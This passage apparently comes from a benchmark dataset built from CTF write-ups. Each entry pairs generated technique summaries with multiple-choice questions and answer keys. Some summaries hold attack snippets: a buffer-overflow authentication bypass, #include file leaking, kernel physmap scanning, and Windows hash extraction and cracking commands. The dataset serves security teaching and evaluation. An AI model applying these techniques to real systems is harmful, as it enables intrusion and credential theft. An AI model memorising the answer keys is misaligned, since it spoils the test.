            "When facing an AES encryption challenge without the initialization vector (IV) and partial ciphertext, one can recover the unknown parts of the ciphertext and consequently the IV by utilizing known plaintext-ciphertext pairs. This method hinges on the property that the decryption of a ciphertext block in AES CBC mode is independent of the IV for blocks after the first one. Therefore, by knowing parts of the ciphertext and the corresponding plaintext, and through a brute-force search for the missing portions of the key, one can decrypt the ciphertext to recover the originally encrypted message.   \nExample payload:\n   - Given partial KEY: `9aF738g9AkI112`\n   - Partial Known Plaintext: `\"The message is protected by AES!\"`\n   - Partial Ciphertext: `9e000000...db9d67f0`\n   - Brute-force the missing key parts and use the known plaintext to validate the key.",
            "After recovering the full ciphertext and key, the initial vector (IV) used for AES encryption can be obtained by XORing the first block of plaintext with the first block of decrypted ciphertext. This approach is specifically applicable in scenarios where the encryption mode is CBC, as the IV is effectively combined with the plaintext of the first block before encryption. This characteristic allows for the retrieval of the IV post decryption if the plaintext and ciphertext are known.\n   - Procedure to recover IV:\n     - Decrypt recovered ciphertext using the found key.\n     - XOR the first block of decrypted ciphertext with the first block of known plaintext.\n     - Convert the result to hexadecimal to obtain the IV.  \nExample payload:\n   - Known PlatinText: `\"The message is protected by AES!\"`\n   - Decrypted Ciphertext (first block): Derived from decryption process.\n   - `IV = Hex(XOR(PlainTextBlock, DecryptedCiphertextBlock))`"
        ],
        "question": [
            "In a scenario where you are given partial AES encryption details such as a partial key, partial plaintext, and partial ciphertext, but without the initialization vector (IV), which strategy allows for the recovery of the unknown parts of the ciphertext and consequently the IV? - A. Using a brute-force attack to guess the IV. - B. Encrypting the known plaintext with different IVs until the output matches the known ciphertext. - C. Utilizing known plaintext-ciphertext pairs to brute-force the missing portions of the key and then decrypting the ciphertext to recover the original message, independent of the IV for blocks after the first one. - D. Attempting different padding techniques on the ciphertext to reveal the IV.",
            "After successfully recovering the full ciphertext and key in an AES CBC mode encryption scenario, how can you obtain the initial vector (IV) used during the encryption process? - A. By hashing the first block of plaintext and comparing it with the first block of the ciphertext. - B. By XORing the first block of plaintext with the first block of decrypted ciphertext, and converting that result to hexadecimal to obtain the IV. - C. By performing a reverse AES decrypt operation on the first block of ciphertext with the key to retrieve the IV. - D. By decrypting the ciphertext with the last block as the IV and adjusting according to the plaintext feedback."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "whyOS",
        "write_up": "dataset/raw/whyOS.md",
        "type": "forensics",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 300,
        "max_score": 1285,
        "difficulty": 0.23346303501945526,
        "knowledge": [
            "When encountering log files in forensics CTF challenges, if initial searches for obvious keywords like \"flag\" are fruitless, one should consider analyzing associated binaries or application packages for hidden functionalities or processes that might reveal how the flag is handled or where it might be located. This includes disassembling binaries to look for specific methods that manipulate or display the flag, as seen with the `setFlag` method in the provided challenge. This approach is particularly useful in challenges involving applications or operating systems, where the flag may be processed or logged by the application.",
            "For extracting flags from large log files where the flag format is unknown and not easily searchable, using regular expressions to match potential flag patterns based on the context provided by the challenge can be highly effective. In scenarios where it's known that the flag is logged by a specific application or under specific conditions, a tailored regex search, such as looking for unique hex strings that don't contain spaces and are within a specific length range (`+Preferences +[^ ]{5,50}$`), can greatly narrow down the search results, making it possible to identify the flag amid extensive logs. This technique is applicable in situations where direct keyword searches are impractical due to the flag being stored or logged in an unconventional format."
        ],
        "question": [
            "In a forensics CTF challenge dealing with an iOS application, a method named `setFlag` in an iOS app binary is being analyzed to find how the flag is manipulated. The method contains the following line: ``` var_10 = [var_10 objectForKey:@\"flag\", @\"flag\"]; ``` Based on this code snippet, what Objective-C programming concept is MOST relevant to understanding how data is being accessed for the flag's potential value? - A. Property Declaration - B. String Manipulation - C. Key-Value Coding - D. Memory Management",
            "In the context of extracting flags from large log files where the flag's format is unknown, which regular expression would be MOST effective for finding a unique hex string logged by an application, given that the flag does not contain spaces and is between 5 to 50 characters long? - A. `/[a-f0-9]{5,50}/` - B. `+Preferences +[^ ]{5,50}$` - C. `/^flag\\{[A-Fa-f0-9]+\\}$/` - D. `/^\\w{5,50}$/`"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Wifi Password of The Day",
        "write_up": "dataset/raw/Wifi Password of The Day.md",
        "type": "crypto",
        "competition": [
            "Tenable/2022",
            "https://ctftime.org/event/1668/tasks/"
        ],
        "score": 200,
        "max_score": 300,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "In scenarios where data is compressed before encryption, the CRIME attack can be utilized to deduce unknown parts of the compressed data by exploiting the compression algorithm's efficiency with repeating sequences. Specifically, when part of the compressed data is known (e.g., a flag format), attackers can submit variations of the data to observe changes in the compressed output's length. The length variation indicates a match or mismatch with the unknown part, allowing for character-by-character brute-forcing of the hidden data. This technique requires the ability to insert controlled data into the compression algorithm alongside the target data.",
            "When dealing with block ciphers like AES in CBC mode, where the plaintext is padded before encryption, adding arbitrary padding to the attacker-controlled data can help align the data to block boundaries. This adjustment facilitates the CRIME attack by ensuring that a single byte of additional compressed data can alter the overall length of the resulting ciphertext. This method is crucial in situations where the encryption mode does not inherently leak compression length through ciphertext length. The 'Two Tries' method further refines this approach by making two attempts with differently ordered data, improving accuracy in identifying correct characters by comparing the lengths of the resulting ciphertexts to distinguish between actual matches and compression-based false positives.\n\nSample of payload for character guess and padding adjustment (conceptual rather than specific code):\n```python\nknown_part = \"flag{\"\nguess_character = \"a\"\npadding = generate_padding_until_block_boundary_is_crossed()  # Conceptual function\nattempt = known_part + guess_character + padding\n```\n\nAnd for the 'Two Tries' method:\n```python\n# Assume \"flag{a\" is the part being tested, and \"~#:/[|/\" is the non-compressible string\nfirst_try = known_part + guess_character + \"~#:/[|/\"\nsecond_try = known_part + \"~#:/[|/\" + guess_character\n```"
        ],
        "question": [
            "In the context of exploiting compression algorithms for data exfiltration, when an attacker knows part of the data being compressed and can insert controlled data before the compression, which attack technique can the attacker utilize to deduce unknown parts of the data?  - A. Differential Cryptanalysis - B. Padding Oracle Attack - C. Side-Channel Attack - D. CRIME Attack ",
            "When conducting a CRIME attack against data encrypted with a block cipher in CBC mode, which method improves the accuracy of deducing the correct characters by ensuring variations in ciphertext length are meaningful?  - A. Incremental Hashing Technique - B. Linear Cryptanalysis - C. 'Two Tries' Method - D. Rainbow Table Attack "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Will it stop_",
        "write_up": "dataset/raw/Will it stop_.md",
        "type": "pwn",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "If a CTF challenge involves accessing or manipulating files on a server where direct execution or reading is restricted, one can misuse the C preprocessor (`cpp`) `#include` directive to leak file contents indirectly through compiler error messages. This technique can be especially effective in challenges where the environment compiles code supplied by the user and returns compiler errors. It works under the condition that the filepath is known or can be guessed and that the compilation process is visible to the user.  \nExample payload: `#include \"/path/to/target/file\"`",
            "To circumvent parsing errors brought about by the contents of an included file during compilation, one can use C preprocessor directives and constructs (`#define`, ternary operators, etc.) to manipulate or bypass the problematic syntax causing the compilation to fail. This is applicable in scenarios where an initial attempt to read a file's contents using the `#include` directive is thwarted by syntax errors reflected in compiler messages. By creatively adjusting or adding to the code, one may force the compiler to reveal more information or even the entire contents of the file.  \n   Example adjustments to bypass parsing errors:  \n   ```\n   #define justCTF 1  \n   int valid_variable = 1;  \n   int another_variable = 1 ? #include </path/to/target/file>  \n   ```"
        ],
        "question": [
            "In a CTF challenge scenario where direct reading of a file on the server is not allowed, and you are given the ability to supply code that gets compiled on the server, which C preprocessor directive can be used to attempt extraction of file contents by causing compiler errors that include parts of the file content? - A. `#include <path/to/file>` - B. `#error \"Display file content\"` - C. `#pragma read \"path/to/file\"` - D. `#define READ_FILE \"path/to/file\"`",
            "When attempting to include a file's content in a submission for a CTF challenge using the `#include` directive results in a compilation error due to syntax issues within the file, which of the following approaches can be used to address the parsing error and potentially reveal more file contents through compiler errors? - A. Wrapping the file's contents inside an executable function block. - B. Using the `#define` directive to create valid syntax before including the file. - C. Renaming the file to have a .c extension and then including it. - D. Changing the file permissions to allow for direct execution rather than inclusion."
        ],
        "answer": [
            "A.",
            "B."
        ]
    },
    {
        "name": "window",
        "write_up": "dataset/raw/window.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": -1.0,
        "max_score": 493,
        "difficulty": -1,
        "knowledge": [
            "When dealing with kernel exploitation challenges that involve bypassing KASLR (Kernel Address Space Layout Randomization), a reliable approach is leveraging fixed addresses in the kernel that are not affected by KASLR. For instance, using the `cpu_entry_area` to leak kernel addresses can help defeat KASLR by reading a pointer that leads to the .text section of the kernel. This technique exploits the fact that certain memory areas remain at constant addresses regardless of ASLR, thereby allowing an attacker to determine the real, randomized addresses of other kernel components or data.",
            "In scenarios where the filesystem, such as `initramfs`, is directly mapped into the physical memory and accessible through the kernel's `physmap`, an arbitrary read primitive can be used to search this memory area for specific patterns or data. This can be particularly useful in CTF challenges or real-world scenarios for extracting sensitive information directly from the memory. By calculating the `physmap` address from a known kernel address (e.g., kernel .text base address) and reading through it, attackers can find and exfiltrate data like flags or credentials embedded within the `initramfs` or other memory-mapped files.\n\nSample exploitation technique for searching a pattern in `physmap`:\n```c\nuint64_t kernel_text_base = ...; // Assume this is already leaked\nuint64_t physmap_base = kernel_text_base + OFFSET_TO_PHYSMAP; // OFFSET_TO_PHYSMAP needs to be determined per kernel version/setup\nuint64_t offset = 0;\nrequest_t req;\nwhile (true) {\n    req.kptr = physmap_base + offset;\n    // Assuming ioctl(fd, 0x1337, &req) is the way to issue the read request, and the data gets populated in req.buf\n    for (size_t i = 0; i < 256; i++) {\n        if (memcmp(req.buf + i, \"FLAG_PATTERN\", FLAG_PATTERN_LENGTH) == 0) {\n            // FLAG_PATTERN and FLAG_PATTERN_LENGTH need to match what you're looking for\n            printf(\"Flag found at offset %lx: %s\\n\", offset + i, req.buf + i);\n            break;\n        }\n    }\n    offset += 256; // Adjust based on the read size\n}\n```\nNote: Replace `FLAG_PATTERN`, `FLAG_PATTERN_LENGTH`, and `OFFSET_TO_PHYSMAP` with values specific to the challenge or target environment."
        ],
        "question": [
            "In a kernel exploitation challenge involving KASLR bypass, the `cpu_entry_area` is utilized for leaking kernel base addresses. Given an arbitrary read primitive, which of the following best represents a correct approach to leverage this area for defeating KASLR? - A. Read the value at a fixed address within the `cpu_entry_area` to find a pointer towards a user-space address, nullifying the effect of KASLR. - B. Modify a pointer within the `cpu_entry_area` to directly control the kernel instruction pointer, bypassing KASLR completely. - C. Use a fixed pointer in the `cpu_entry_area` to leak a kernel .text address, thereby circumventing KASLR. - D. Execute arbitrary code in the `cpu_entry_area` to disable KASLR at runtime without requiring a memory address leak. ",
            "Given an arbitrary read primitive in a kernel challenge where `initramfs` is directly accessible through the kernel\u2019s `physmap`, which approach allows for the extraction of specific data patterns (e.g., \"ictf\")? - A. Writing a pattern to `initramfs` through ioctl and then using the arbitrary read primitive to verify the write operation, ensuring data integrity. - B. Calculating the `physmap` base address from the leaked kernel .text base and scanning for the pattern \"ictf\" to find sensitive information. - C. Invoking a direct kernel panic to dump the contents of `initramfs`, making it possible to analyze the memory for the \"ictf\" pattern offline. - D. Overwriting the `initramfs` mapping in the `physmap` to control kernel execution flow, enabling the execution of code stored in the pattern \"ictf\". "
        ],
        "answer": [
            "C. Use a fixed pointer in the `cpu_entry_area` to leak a kernel .text address, thereby circumventing KASLR.",
            "B. Calculating the `physmap` base address from the leaked kernel .text base and scanning for the pattern \"ictf\" to find sensitive information."
        ]
    },
    {
        "name": "Winter",
        "write_up": "dataset/raw/Winter.md",
        "type": "crypto",
        "competition": [
            "InCTF/2018",
            "https://ctftime.org/event/662/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When attacking an implementation of the Winternitz One-Time Signature scheme, a vulnerability may exist if the scheme allows an attacker to learn information about intermediate hash chain nodes from an original signature. This exposure can lead to signature forgery if for two messages \\(m_1\\) and \\(m_2\\), the condition \\(256 - n_1 < 256 - n_2\\) holds for every byte in their respective SHA-256 hashes. In such cases, an adversary can hash parts of the given signature from \\(m_1\\) the necessary number of times to forge a signature for \\(m_2\\), assuming they can control or know \\(m_2\\) to ensure the condition is met.",
            "To exploit the vulnerability in a practical scenario involving the Winternitz One-Time Signature scheme, one can use a brute force approach to find pairs of messages where the SHA-256 hash of the first message \\(m_1\\) has each byte greater than the corresponding byte in the SHA-256 hash of the second message \\(m_2\\). This allows the forging of a signature for \\(m_2\\) using the signature for \\(m_1\\). The approach involves iterating through possible messages, calculating their hashes, and checking if the condition \\(m_{1_{hash}[i]} > m_{2_{hash}[i]}\\) for all i in the hash bytes is satisfied. Once a valid pair is found, intermediate hashing steps from the original signature can be used to generate a new signature for \\(m_2\\).\n   \n   Example brute force algorithm snippet (Python):\n   ```py\n   from hashlib import sha256\n\n   # Initialize min and max values to track the extremes\n   largest_min_value_of_maxlist = 0\n   smallest_max_value_of_minlist = 256\n\n   # Placeholder for minimum and maximum messages and their hash lists\n   minlist, maxlist = [], []\n   min_msg, max_msg = '', ''\n\n   # Brute force through potential messages\n   for i in range(10000000):\n       h = sha256(str(i).encode()).digest()\n       mx, mn = max(h), min(h)\n       # Update smallest and largest tracking variables\n       smallest_max_value_of_minlist = min(smallest_max_value_of_minlist, mx)\n       largest_min_value_of_maxlist = max(largest_min_value_of_maxlist, mn)\n\n       # Logic to check and break if condition is met\n       # Detailed logic based on comparison of min and max lists as per challenge requirements\n   ```\n   \n   Using this information and methodology can lead to successfully exploiting vulnerabilities in certain cryptographic implementations, specifically those involving the reuse or exposure of intermediate hash states in schemes like the Winternitz One-Time Signature."
        ],
        "question": [
            "In the context of attacking the Winternitz One-Time Signature scheme, what condition must hold true for every byte of the SHA-256 hashes of two messages (`m_1` and `m_2`) to successfully forge a signature for `m_2` using the signature of `m_1`? - A. \\(256 - n_1 == n_2\\) - B. \\(n_1 == n_2\\) - C. \\(256 - n_1 > n_2\\) - D. \\(256 - n_1 < 256 - n_2\\)",
            "What approach can be used to exploit a vulnerability in the Winternitz One-Time Signature scheme that allows for the forging of a signature by finding two messages (`m_1` and `m_2`) where for every corresponding byte, the byte in the SHA-256 hash of `m_1` is greater than the same byte in the SHA-256 hash of `m_2`? - A. Differential cryptanalysis - B. Brute force comparison of messages to find valid `m_1` and `m_2` pairs based on their SHA-256 hashes - C. Frequency analysis of hash outputs - D. Implementing collision attacks on the hash function"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "wisdom2",
        "write_up": "dataset/raw/wisdom2.md",
        "type": "pwn",
        "competition": [
            "HXP/2020",
            "https://ctftime.org/event/1134/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting operating systems or software, inspecting the implementation of system calls like ptrace can reveal vulnerabilities where registers or flags are not properly validated. In this case, the vulnerability lay in setting the eflags to arbitrary values, allowing an attacker to modify the IOPL bits, thus gaining access to I/O ports and the interrupt flag in userspace. Whenever dealing with system-level programming or security evaluations, pay attention to how input is validated, especially when it involves register states or system flags that control hardware access levels.",
            "To exploit vulnerabilities that allow for arbitrary register manipulation, one approach is to enable specific capabilities (like setting IOPL to 3 for accessing I/O ports in userspace) and then execute or inject code that performs operations not usually permitted in Ring 3 (userspace). This could include writing a simple driver to read from or write to a device directly, leveraging existing drivers or code snippets. For this specific vulnerability, using an ATA driver allowed reading the flag directly from an IDE drive. This exploitation technique is especially powerful in kernels or operating systems challenges and should be considered when direct memory, device access, or privilege escalation is needed.\n\n    Example snippet for setting IOPL and leveraging an ATA driver to read from /dev/hdb:\n    ```C\n    // This is a conceptual snippet and may not work as-is\n    ptrace_regs.eflags |= 3 << 12; // Set IOPL to 3\n    execute_ata_pio_read(\"/dev/hdb\"); // Function to utilize an ATA PIO driver to read the disk\n    ```"
        ],
        "question": [
            "In a CTF challenge involving operating system security, attackers discovered a flaw in an OS's `ptrace` function, particularly in how it manages the `eflags` register. What specific part of the `eflags` register's modification caused a security vulnerability, enabling userspace access to I/O Ports?  - A. Modifying the Sign Flag (SF) to alter arithmetic operation outcomes. - B. Changing the IOPL (I/O Privilege Level) bits to give Ring 3 processes access to I/O ports. - C. Altering the Zero Flag (ZF) to affect the results of conditional jumps and loops. - D. Adjusting the Trap Flag (TF) to enable step-by-step execution. ",
            "Considering an exploitation technique for a vulnerability in an operating system's handling of register states, which strategy would be most effective for utilizing arbitrary register manipulation to access hardware directly from userspace?  - A. Setting the Direction Flag (DF) to change the direction of string operations. - B. Modifying the Auxiliary Carry Flag (AF) to influence decimal arithmetic. - C. Changing the IOPL (I/O Privilege Level) to 3 and using a pre-made ATA driver to read from an IDE drive. - D. Adjusting the Parity Flag (PF) to control byte parity in data transfers. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Wolfie's Password",
        "write_up": "dataset/raw/Wolfie's Password.md",
        "type": "forensics",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 425,
        "max_score": 499,
        "difficulty": 0.8517034068136272,
        "knowledge": [
            "When dealing with password-protected RAR files in CTF challenges, and the scenario involves a Windows environment, it's important to check the Windows directory `/Windows/system32/config` for the SAM and SYSTEM files (`sam.hiv` and `system.hiv`). These files can contain hashed user passwords that, once extracted using tools like `samdump2`, can be cracked with password cracking tools such as John the Ripper (JTR) using a common wordlist like `rockyou.txt`. \n   \n   Example command to extract hashes: `samdump2 system.hiv sam.hiv > hashes.txt`",
            "After obtaining the hashes, use John the Ripper with the NT format and a comprehensive wordlist to crack the hashed passwords. This step relies on the availability of hashed passwords and suitable cracking tools. The effectiveness of this approach depends on the strength of the password and the completeness of the wordlist. \n\n   Example command to crack hashes: `john --format=NT hashes.txt --wordlist=/path/to/rockyou.txt`"
        ],
        "question": [
            "When investigating a Windows-based system for password hashes related to a password-protected RAR file, where should you first look to extract the necessary hash files for cracking? - A. /var/log/auth.log - B. /Windows/system32/config - C. /etc/shadow - D. /usr/local/bin",
            "In the context of cracking Windows password hashes extracted during a forensic investigation, which of the following commands is correctly formatted to use John the Ripper with a common wordlist? - A. john --wordlist=/path/to/rockyou.txt --format=NT hashes.txt - B. hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt - C. aircrack-ng -w /path/to/wordlist.txt hashes.txt - D. sudo nmap -sV --script=hashes.txt"
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "WOLPHV V_ luvh4ck573",
        "write_up": "dataset/raw/WOLPHV V_ luvh4ck573.md",
        "type": "web",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering challenges that involve identifying the owner of a social media account, one effective strategy is to search for usernames or unique identifiers across different platforms. This can lead you to unforeseen connections and additional information. For instance, discovering a username within a photo or video description on one platform (such as Tinder) could lead to a match on another platform (e.g., YouTube, Instagram), where the username is utilized in a similar or exact format. Utilizing search engines effectively, including searching for video titles or archived content, can reveal previously obscured or deleted information that is crucial for solving the puzzle.",
            "Utilizing specialized tools for gathering information about individuals based on their online presence can significantly advance the investigation in OSINT (Open Source Intelligence) challenges. For example, tools like Ghunt can be used to extract a real name or additional details from an email address found in publicly accessible archives or cached web pages. This method is particularly effective in scenarios where the challenge involves piecing together clues from various online sources to uncover a target's identity or location. Understanding and leveraging the capabilities of such tools can uncover new leads from seemingly insignificant details."
        ],
        "question": [
            "In the context of OSINT challenges, where you've discovered a username \"nathan-rizz-blog67945\" that seems linked to social media accounts, what is the next best approach for uncovering additional information related to this individual? - A. Attempt to reset the password for the username on various platforms to receive hints about the associated email or phone number. - B. Use the username to search across different social media platforms and public archives to find accounts with matching or similar usernames. - C. Ignore the username as it is likely a red herring and focus exclusively on the original website where it was found. - D. Change the username slightly (e.g., \"nathan-rizz-blog67946\") and search for that instead, assuming a typo was made in the original information. ",
            "When you stumble upon an email address in a YouTube video archive that appears to be connected to an individual of interest in an OSINT challenge, which of the following tools or methods is the most effective for extracting additional valuable information from the email address? - A. Send a test email to the address asking for more information about the individual. - B. Use an email verification service to see if the email address is active and valid. - C. Deploy a brute-force attack to gain unauthorized access to the email account. - D. Utilize specialized tools like Ghunt to analyze the email address and uncover associated public profiles or information. "
        ],
        "answer": [
            "B. Use the username to search across different social media platforms and public archives to find accounts with matching or similar usernames.",
            "D. Utilize specialized tools like Ghunt to analyze the email address and uncover associated public profiles or information."
        ]
    },
    {
        "name": "woogie-boogie",
        "write_up": "dataset/raw/woogie-boogie.md",
        "type": "reverse",
        "competition": [
            "LA/2024",
            "https://ctftime.org/event/2102/tasks/"
        ],
        "score": 499,
        "max_score": 499,
        "difficulty": 1.0,
        "knowledge": [
            "For challenges involving Out-Of-Bounds (OOB) vulnerabilities, it can be exploited to gain unlimited relative stack access. This can be achieved by leveraging the ability to read or write to arbitrary stack locations that are not validated or bound-checked by the program. This type of vulnerability can be used to modify return addresses, manipulate function pointers, or leak memory addresses to defeat ASLR (Address Space Layout Randomization). To exploit such vulnerabilities, carefully crafted inputs or payloads that take advantage of the program's failure to validate offsets or lengths are required. These can lead to arbitrary code execution or leakage of sensitive information.",
            "XOR swap vulnerabilities can be ingeniously abused to manipulate memory in unintended ways, especially when combined with OOB vulnerabilities. Specifically, if a program allows swapping memory contents using XOR operations without properly checking the boundaries or the integrity of the operation, it's possible to create conditions where values in memory can be zeroed out or arbitrarily modified. This is particularly exploitable when the XOR operation involves pointers or indexes that can be controlled by an attacker, allowing for memory corruption or control-flow hijacking. A key strategy in exploiting such vulnerabilities involves crafting payloads that manipulate stored addresses or values in memory to alter program behavior or gain unauthorized access to system resources."
        ],
        "question": [
            "Given the scenario of exploiting an Out-Of-Bounds (OOB) vulnerability to gain unlimited relative stack access in a binary challenge, which of the following is a potential consequence of exploiting this type of vulnerability? - A. The program performs faster due to optimized memory access. - B. The stack's integrity is preserved, preventing any unauthorized access. - C. Arbitrary code execution or leakage of sensitive information due to modification of return addresses or function pointers. - D. Automatic correction of the vulnerable code by the compiler during runtime.",
            "In the context of exploiting a XOR swap vulnerability combined with an OOB vulnerability, which of the following best describes a correct approach to leverage such vulnerabilities for manipulating memory in unintended ways? - A. Create a firewall rule to block the XOR operation from executing. - B. Craft payloads that manipulate stored addresses or values in memory to alter program behavior or gain unauthorized access. - C. Use XOR operations to encrypt data stored in memory, enhancing the program's security. - D. Recommend the use of XOR for password hashing to improve the application's overall security posture."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Woooosh",
        "write_up": "dataset/raw/Woooosh.md",
        "type": "The type of this CTF challenge is **web**.",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 130,
        "max_score": 300,
        "difficulty": 0.43333333333333335,
        "knowledge": [
            "In challenges involving overcoming game mechanics or automated points scoring where direct exploitation or reverse engineering is impractical due to obfuscation or complexity, using automation scripts that interact with the game's graphical components can be an effective strategy. For example, a Python script utilizing `pyautogui` can be employed to continuously scan for and interact with specific elements on the screen, such as clicking a target icon, to achieve the necessary points for victory.\n\nExample payload:\n```python\nimport pyautogui\nfor x in range(200):  \n    dot = pyautogui.locateCenterOnScreen('dot.png', region=(665, 310, 580, 325))\n    if dot is not None:  \n        pyautogui.click(dot)\n```",
            "When developing an automation script to interact with application elements, especially in graphical user interface environments, it's crucial to optimize the search region for the target elements to improve performance and accuracy. In the provided Python script example, the search region for the target 'dot' is explicitly defined (`region=(665, 310, 580, 325)`) within `pyautogui.locateCenterOnScreen`. This method significantly reduces processing time by limiting the screen area that `pyautogui` needs to scan, increasing the efficiency of the script in real-time scenarios where speed is essential.\n\nExample payload:\n```python\n# Example of defining a search region for improved performance\ndot = pyautogui.locateCenterOnScreen('dot.png', region=(665, 310, 580, 325))\n```"
        ],
        "question": [
            "In a scenario where you are tasked with automating clicks on a target \"dot\" in a game to score points, bypassing the need for manual interaction amidst heavily obfuscated JavaScript on the frontend, which Python library and method combination is appropriate for identifying and clicking on graphical elements on the screen based on their appearance?  - A. Using the `requests` library with the `get` method to find and click on the dot. - B. Using the `selenium` library with the `find_element_by_id` method to interact with the dot. - C. Using the `pyautogui` library with the `locateCenterOnScreen` and `click` methods to automate finding and clicking the dot. - D. Using the `matplotlib` library with the `plot` method to locate and click the dot. ",
            "When optimizing an automation script to interact with a game for scoring points by clicking a specified \"dot\" on the screen, why is it important to define a specific search region within the `pyautogui.locateCenterOnScreen` function, as shown in the provided example?  - A. It increases the size of the screenshots saved to disk, improving accuracy. - B. It eliminates the need for any graphical output, speeding up the script. - C. It reduces the processing time by limiting the screen area that needs to be scanned, increasing efficiency. - D. It enhances the color accuracy of the `dot.png` image, ensuring better recognition. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "wooter",
        "write_up": "dataset/raw/wooter.md",
        "type": "reverse",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing a binary's interaction model using tools like `strace`, if it shows no interaction with the filesystem (e.g., opening or reading files), it suggests that the input is either passed as arguments or through environment variables. This knowledge helps focus reverse engineering efforts on how the binary handles inputs directly provided to it, streamlining the analysis process.",
            "The technique of manipulating the outcome of the `rand()` function by hooking it to always return a fixed value (e.g., 0) can significantly speed up the execution of a binary. This is particularly useful when dealing with binaries that employ `rand()` calls to generate obfuscation or delay execution as a form of anti-analysis measure. By deploying a custom shared library with an overridden `rand()` that returns 0, the execution time can be drastically reduced, which aids in dynamic analysis and debugging processes.\n    - Example of C code for `norand.c` to override `rand()`:\n      ```c\n      int rand() { return 0; }\n      ```\n    - Example command to use the custom `norand.so` library:\n      ```sh\n      $ LD_PRELOAD=./norand.so ./binary\n      ```"
        ],
        "question": [
            "In a scenario where you're analyzing a binary using `strace` and notice it does not interact with the filesystem, how should one proceed to identify how the binary might be receiving input? - A. Assume the binary uses hard-coded input values and does not accept external inputs. - B. Focus on the environment variables and command-line arguments as possible input sources. - C. Immediately decompile the binary to search for hidden file interactions not caught by `strace`. - D. Check for network connections as the primary input source. ",
            "When dealing with a binary that utilizes the `rand()` function calls within a loop for obfuscation or to delay execution, what technique can be applied to facilitate faster execution for analysis? - A. Modify the binary to remove all `rand()` calls manually through patching. - B. Increase the system's computational power to handle the demands of `rand()` processing more efficiently. - C. Use a custom shared library where `rand()` is overridden to always return a fixed value, such as 0. - D. Run the binary in a high-performance emulation environment that automatically optimizes `rand()` calls. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "worm 2",
        "write_up": "dataset/raw/worm 2.md",
        "type": "pwn",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 295,
        "max_score": 299,
        "difficulty": 0.9866220735785953,
        "knowledge": [
            "When encountering a binary with a stack-based buffer overflow vulnerability (BOF), specifically where input is read via an unsafe function like `gets()`, overflowing the buffer into adjacent variables can allow for control over those variables' values. This can be leveraged to meet certain condition checks within the program, such as authentication mechanisms. In scenarios where an adjacent variable to the buffer is checked against a specific value for authentication, carefully crafting the input to overflow the buffer and overwrite this variable with the expected value can grant unauthorized access.\n   - Example payload for overwriting an adjacent password variable to bypass authentication: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd`",
            "In challenges requiring the exploration of directory structures where directories represent nodes of a binary tree and the goal is finding a specific file, a depth-first search (DFS) approach can be effectively automated using a self-replicating script. This script recursively explores the tree by executing itself after gaining access to each subsequent node or directory with required privileges, thus covering all potential paths where the file could reside. The strategy combines gaining necessary privileges (e.g., through exploiting a binary in each node to escalate privileges or access restricted directories) and a self-replicating mechanism to traverse the binary tree structure efficiently within constraints such as a maximum character limit for the exploit code.\n   - Example self-replicating script payload part: Assume the script is stored as `/tmp/solve.sh`. To replicate and continue the search in directories `room0` and `room1`, the script could contain: \n     ```bash\n     payload=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd\n     (echo $payload && echo \"cd room0 && exec bash /tmp/solve.sh\") | ./key > /dev/null\n     (echo $payload && echo \"cd room1 && exec bash /tmp/solve.sh\") | ./key > /dev/null\n     ```"
        ],
        "question": [
            "Given a scenario where a program contains a buffer overflow vulnerability due to the use of the `gets()` function, with the buffer adjacent to a password variable. If the program's logic checks this password variable for a specific value to grant authentication, which of the following payloads would correctly exploit this vulnerability to overflow the buffer and overwrite the password variable with the required value of 'p4ssw0rd' to bypass authentication?  - A. `echo -n 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | ./program` - B. `echo -n 'p4ssw0rd' | ./program` - C. `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd` - D. `printf '%32sp4ssw0rd' | ./program` ",
